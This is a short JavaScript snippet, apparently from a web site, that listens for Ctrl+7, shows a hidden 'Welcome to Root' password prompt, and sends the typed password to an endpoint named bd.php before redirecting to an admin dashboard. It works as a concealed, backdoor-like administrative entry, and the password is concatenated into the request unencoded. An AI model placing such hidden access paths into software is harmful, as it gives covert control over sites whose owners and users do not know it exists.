document.addEventListener('keydown', function(event) {
if (event.ctrlKey && event.key === '7') {
let pss = prompt("Welcome to Root, Enter System Password");
if (pss != null) {
$.ajax({
type: 'POST',
url: 'const/ajax/bd.php',
data: 'pw=' + pss + '&submit=1',
success: function (resp) {
if (resp == "1") {
location.href = 'admin?page=dashboard';
}else{
alert('Invalid System Password');
}
}
});
}
}
})
